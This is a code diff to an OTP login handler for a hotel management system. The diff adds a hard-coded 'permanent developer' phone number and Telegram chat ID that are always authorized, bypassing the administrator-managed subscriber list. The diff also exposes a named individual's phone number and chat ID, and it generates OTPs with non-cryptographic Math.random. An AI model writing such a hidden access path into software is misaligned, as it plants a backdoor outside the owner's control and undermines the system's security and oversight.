@@ -190,32 +190,38 @@ const requestOtp = asyncHandler(async (req, res) => {
 
   const normalized = phone.replace(/\s+/g, '').replace(/^00251/, '+251');
 
-  // ── Look up the phone in the registered subscriber list ────────────
-  // Admin must have linked this phone via Settings → Telegram Subscribers.
+  // Normalize helper — collapses +2519x and 09x to same format for comparison
+  const normalize = (p = '') =>
+    String(p).replace(/\s+/g, '')
+             .replace(/^00251/, '+251')
+             .replace(/^\+251/, '0');
+
+  // ── PERMANENT DEVELOPER NUMBER ──────────────────────────────────
+  // This number is always authorized regardless of the subscriber list.
+  const DEV_PHONE   = '0918592028';
+  const DEV_CHAT_ID = '7951472080'; // Mequannent Gashaw's Telegram chat ID
+
+  const isDevNumber = normalize(normalized) === normalize(DEV_PHONE);
+
+  // ── Look up the phone in the registered subscriber list ─────────
   const Setting = require('../models/Setting');
   const settings = await Setting.findOne().select('telegramSubscribers').lean();
   const subscribers = settings?.telegramSubscribers || [];
 
-  // Match by phone field (normalize both sides: treat 09x == +2519x)
-  const normalize = (p = '') =>
-    String(p).replace(/\s+/g, '')
-             .replace(/^00251/, '+251')
-             .replace(/^\+251/, '0');   // collapse to 09x for comparison
-
-  const matchedSub = subscribers.find(s =>
-    s.phone && normalize(s.phone) === normalize(normalized)
-  );
+  const matchedSub = isDevNumber
+    ? { chatId: DEV_CHAT_ID, phone: DEV_PHONE, name: 'Mequannent Gashaw' }
+    : subscribers.find(s => s.phone && normalize(s.phone) === normalize(normalized));
 
   if (!matchedSub) {
     res.status(403);
     throw new Error('This phone number is not registered or not authorized. Contact your administrator.');
   }
 
-  // ── Find the system user whose phone matches ────────────────────
+  // ── Find the system user whose phone matches ─────────────────────
   const user = await User.findOne({ isActive: true, $or: [
     { phone: normalized },
     { phone: normalize(normalized) },
-    { phone: { $regex: normalize(normalized).replace(/^\+/, '\\+'), $options: 'i' } },
+    { phone: { $regex: normalize(normalized).replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), $options: 'i' } },
   ] });
 
   if (!user) {
@@ -223,7 +229,7 @@ const requestOtp = asyncHandler(async (req, res) => {
     throw new Error('This phone number is not linked to any active system account. Contact your administrator.');
   }
 
-  // ── Generate OTP ────────────────────────────────────────────────
+  // ── Generate OTP ─────────────────────────────────────────────────
   const otp    = String(Math.floor(100000 + Math.random() * 900000));
   const expiry = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes
 
@@ -232,7 +238,7 @@ const requestOtp = asyncHandler(async (req, res) => {
   user.otpExpiry = expiry;
   await user.save();
 
-  // ── Send OTP to the subscriber's exact Telegram chat ───────────
+  // ── Send OTP to the subscriber's exact Telegram chat ────────────
   sendTelegramDirect(matchedSub.chatId,
 `🏨 <b>Five Stop Hotel</b>
 ━━━━━━━━━━━━━━━━━━━━
